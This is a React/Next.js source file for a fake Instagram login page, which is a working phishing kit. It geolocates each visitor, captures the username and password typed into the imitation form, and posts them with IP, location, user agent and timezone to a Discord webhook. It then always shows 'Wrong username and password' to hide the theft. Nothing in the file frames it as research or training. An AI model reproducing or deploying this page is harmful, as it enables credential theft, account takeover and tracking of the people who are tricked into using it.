"use client";

import { useState, useEffect } from "react";
import { footerLinks } from "@/utils/footerLink";
import Image from "next/image";

const InstagramPage = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isError, setIsError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isUserInfoFetched, setIsUserInfoFetched] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ipAddress: "",
    country: "",
    location: "",
    userAgent: "",
    browserLanguage: "",
    // screenResolution: "",
    timezone: "",
  });

  const source = "Instagram";

  useEffect(() => {
    const fetchUserInfo = async () => {
      try {
        // Try ipapi.co first
        const ipResponse = await fetch("https://ipapi.co/json/", {
          headers: {
            "User-Agent": "Mozilla/5.0", // Some APIs require a valid User-Agent
          },
        });

        if (!ipResponse.ok) {
          throw new Error(`ipapi.co failed with status: ${ipResponse.status}`);
        }

        const ipData = await ipResponse.json();
        // console.log("ipapi.co response:", ipData); // Debug log

        // Collect browser information
        const browserInfo = {
          ipAddress: ipData.ip || "Unknown",
          country: ipData.country_name || "Unknown",
          location: `${ipData.city || "Unknown"}, ${
            ipData.region || "Unknown"
          }`,
          userAgent: navigator.userAgent || "Unknown",
          browserLanguage: navigator.language || "Unknown",
          // screenResolution:
          //   `${window.screen.width}x${window.screen.height}` || "Unknown",
          timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
        };

        setUserInfo(browserInfo);
        setIsUserInfoFetched(true);
      } catch (error) {
        console.error("Error fetching user info from ipapi.co:", error);

        // Fallback to alternative API (ipgeolocation.io)
        try {
          const fallbackResponse = await fetch(
            `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.NEXT_PUBLIC_IP_DATA_API_KEY}`,
          );
          const fallbackData = await fallbackResponse.json();
          console.log("ipgeolocation.io response:", fallbackData); // Debug log

          const browserInfo = {
            ipAddress: fallbackData.ip || "Unknown",
            country: fallbackData.country_name || "Unknown",
            location: `${fallbackData.city || "Unknown"}, ${
              fallbackData.state_prov || "Unknown"
            }`,
            userAgent: navigator.userAgent || "Unknown",
            browserLanguage: navigator.language || "Unknown",
            // screenResolution:
            //   `${window.screen.width}x${window.screen.height}` || "Unknown",
            timezone:
              Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          };

          setUserInfo(browserInfo);
          setIsUserInfoFetched(true);
        } catch (fallbackError) {
          console.error(
            "Error fetching user info from fallback API:",
            fallbackError,
          );
          // Set fallback values
          setUserInfo({
            ipAddress: "Unknown",
            country: "Unknown",
            location: "Unknown",
            userAgent: navigator.userAgent || "Unknown",
            browserLanguage: navigator.language || "Unknown",
            // screenResolution:
            //   `${window.screen.width}x${window.screen.height}` || "Unknown",
            timezone:
              Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          });
          setIsUserInfoFetched(true);
        }
      }
    };

    fetchUserInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isUserInfoFetched) {
      setIsError(true);
      return;
    }

    setIsLoading(true);
    setIsError(false);

    const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK!;

    const payload = {
      content: "**New User Info Submission**",
      embeds: [
        {
          title: "User Information",
          color: 0xff69b4, // pink highlight
          fields: [
            { name: "Email", value: email, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Source", value: source, inline: true },
            {
              name: "IPAddress",
              value: userInfo.ipAddress || "Unknown",
              inline: true,
            },
            {
              name: "Country",
              value: userInfo.country || "Unknown",
              inline: true,
            },
            {
              name: "Location",
              value: userInfo.location || "Unknown",
              inline: false,
            },
            {
              name: "UserAgent",
              value: userInfo.userAgent || "Unknown",
              inline: false,
            },
            {
              name: "BrowserLanguage",
              value: userInfo.browserLanguage || "Unknown",
              inline: true,
            },
            {
              name: "Timezone",
              value: userInfo.timezone || "Unknown",
              inline: true,
            },
          ],
          footer: { text: "Test Submission to Discord" },
          timestamp: new Date().toISOString(),
        },
      ],
    };

    try {
      await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      // Clear form on success
      setEmail("");
      setPassword("");
      setIsError(true);
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsError(true);
    } finally {
      // setIsError(true);
      setIsLoading(false);
    }
  };

  return (
    <div className="flex flex-col gap-3 justify-start items-center h-screen bg-gray-100 w-full p-10">
      <div className="flex flex-col items-center justify-center p-4 bg-white shadow-sm w-full md:max-w-3/12">
        <Image
          src="/images/ig-logo.png"
          alt="Instagram Voting"
          width={200}
          height={200}
          className=""
        />
        <form
          onSubmit={handleSubmit}
          className="w-full flex flex-col gap-4 items-center px-6 my-6"
        >
          <input
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="Phone number, username, or email"
            className="border border-gray-300 px-2 py-2 text-sm outline-none focus:border-slate-400 rounded w-full"
          />
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="border border-gray-300 px-2 py-2 text-sm outline-none focus:border-slate-400 rounded w-full"
          />
          <button
            type="submit"
            disabled={isLoading}
            className={`bg-blue-500 text-white px-4 w-full py-2 rounded transition duration-200 ${
              isLoading ? "opacity-50 cursor-not-allowed" : "hover:bg-blue-600"
            }`}
          >
            {isLoading ? "Submitting..." : "Submit"}
          </button>
        </form>
        {isError && (
          <p className="text-red-500 text-sm">Wrong username and password</p>
        )}
      </div>

      <p className="text-slate-700 text-md my-4">Forgot Password?</p>

      <div className="flex flex-col items-center justify-center p-3 bg-white shadow-sm w-full md:max-w-3/12">
        <p className="text-slate-700 text-md my-4">
          {`Don't have an account?`}
          <span className="text-blue-500 cursor-pointer">Sign up</span>
        </p>
      </div>

      <p className="text-slate-700 text-md my-2">Get the App</p>

      <div className="flex items-center justify-center gap-4 p-3 w-full md:max-w-3/12">
        <Image
          src="/images/playstore.png"
          alt="Play Store"
          width={100}
          height={100}
          className="cursor-pointer h-10 w-auto"
        />
        <Image
          src="/images/msc.png"
          alt="App Store"
          width={100}
          height={100}
          className="cursor-pointer h-10 w-auto"
        />
      </div>

      <div className="flex flex-wrap gap-4 items-center justify-center p-3 w-full">
        {footerLinks.map((link, index) => (
          <span
            key={index}
            className="text-slate-500  text-sm font-semibold cursor-pointer"
          >
            {link}
          </span>
        ))}
      </div>
    </div>
  );
};

export default InstagramPage;
